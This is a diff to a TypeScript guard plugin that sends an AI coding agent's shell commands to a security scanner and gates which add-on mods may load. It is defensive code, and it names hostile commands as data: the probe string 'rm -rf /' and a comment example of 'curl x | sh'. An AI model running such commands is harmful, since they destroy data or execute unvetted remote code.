@@ -5,7 +5,9 @@
 // over the Go engine. Every shell command the model asks to run (Bash,
 // Monitor, any tool with a string `command`, and an MCP tool's command, cmd,
 // script or code argument) is piped on stdin to `guardclaw-scan
-// --stdin-command` through $.process.run, with no shell in between. The mod
+// --stdin-command --agent` through $.process.run, with no shell in between.
+// Agent mode judges each simple command inside a line, so `cd src && npm
+// test` runs and `cd /tmp && curl x | sh` does not. The mod
 // runtime has no WebAssembly on purpose, so compiled code runs as a process
 // of its own.
 //
@@ -20,9 +22,11 @@ import {
   commandStringsOf,
   degradedVerdict,
   expandHome,
+  DEFAULT_TRUSTED_MARKETPLACES,
   protectedWrite,
   riskyCallsOf,
   riskyEventsOf,
+  trustedMarketplaceOf,
   WRITE_TOOLS,
   type Verdict,
 } from './rules.ts'
@@ -32,7 +36,7 @@ export const INSTALL_LINE = 'go install github.com/TakeInterestInc/guardclaw-cor
 /** How long one scan may take before that call is denied. */
 const SCAN_TIMEOUT_MS = 10_000
 
-/** The probe a working scanner must deny: proves the binary runs and has --stdin-command. */
+/** The probe a working scanner must deny: proves the binary runs and has --stdin-command --agent. */
 export const PROBE_COMMAND = 'rm -rf /'
 
 type Mode = 'scanner' | 'degraded'
@@ -125,7 +129,7 @@ function message(error: unknown): string {
 /** Runs the probe once: `scanner` when guardclaw-scan starts and denies it, `degraded` otherwise. */
 async function probe($: EngineInterface, scannerPath: string): Promise<Mode> {
   try {
-    const r = await $.process.run([scannerPath, '--stdin-command'], { stdin: PROBE_COMMAND, timeoutMs: SCAN_TIMEOUT_MS })
+    const r = await $.process.run([scannerPath, '--stdin-command', '--agent'], { stdin: PROBE_COMMAND, timeoutMs: SCAN_TIMEOUT_MS })
     const line = parseScanLine(r.stdout)
     if (r.exitCode === 1 && line?.decision === 'deny') return 'scanner'
     log($, `GuardClaw: ${scannerPath} did not deny the probe (exit ${r.exitCode}); running degraded. Install: ${INSTALL_LINE}`, 'transcript')
@@ -153,7 +157,7 @@ function modeOf($: EngineInterface, scannerPath: string): Promise<Mode> {
 async function scan($: EngineInterface, scannerPath: string, command: string): Promise<Verdict | undefined> {
   let r
   try {
-    r = await $.process.run([scannerPath, '--stdin-command'], { stdin: command, timeoutMs: SCAN_TIMEOUT_MS })
+    r = await $.process.run([scannerPath, '--stdin-command', '--agent'], { stdin: command, timeoutMs: SCAN_TIMEOUT_MS })
   } catch (error) {
     return { rule: 'scanner_error', reason: `the GuardClaw scanner did not finish (${message(error)}), so this call is denied; the next one is scanned again` }
   }
@@ -188,6 +192,7 @@ function rootReal($: EngineInterface): Promise<string | undefined> {
 export const register: Register = (on, options) => {
   const allowMods = list(options.allowMods)
   const extraDenyPatterns = list(options.extraDenyPatterns)
+  const trustedMarketplaces = options.trustedMarketplaces === undefined ? DEFAULT_TRUSTED_MARKETPLACES : list(options.trustedMarketplaces)
   const scannerPath = typeof options.scannerPath === 'string' && options.scannerPath.trim() !== '' ? options.scannerPath.trim() : 'guardclaw-scan'
 
   on('session.start', async ($, e, next) => {
@@ -241,7 +246,8 @@ export const register: Register = (on, options) => {
   // Admission: a later user or append mod that could approve a tool call,
   // answer one of the guard's own calls, run host commands, write files,
   // change settings or reach the network is refused unless its exact
-  // name@marketplace is in allowMods. Prepend (managed) and built-in mods are
+  // name@marketplace is in allowMods or it comes from a trusted marketplace
+  // (by default `builtin` and Anthropic's `claude-plugins-official`). Prepend (managed) and built-in mods are
   // an administrator's and the binary's, not checked here.
   on('plugin.register', ($, e, next) => {
     if (e.root === $.plugin.root) return next(e)
@@ -258,6 +264,11 @@ export const register: Register = (on, options) => {
     const isAllowlisted = allowMods.includes(e.provenance) && !e.provenance.endsWith('@inline')
     if (isAllowlisted) {
       log($, `GuardClaw: allowed mod ${e.provenance} (${parts}) because it is in allowMods`, 'debug')
+      return next(e)
+    }
+    const marketplace = trustedMarketplaceOf(e.provenance, trustedMarketplaces)
+    if (marketplace !== undefined) {
+      log($, `GuardClaw: allowed mod ${e.provenance} (${parts}) because ${marketplace} is a trusted marketplace`, 'debug')
       return next(e)
     }
     const reason = `GuardClaw refused mod ${e.provenance}: ${parts}, which can approve tool calls, answer the guard's own checks or act outside the session. Add "${e.provenance}" to the guardclaw allowMods option to load it.`
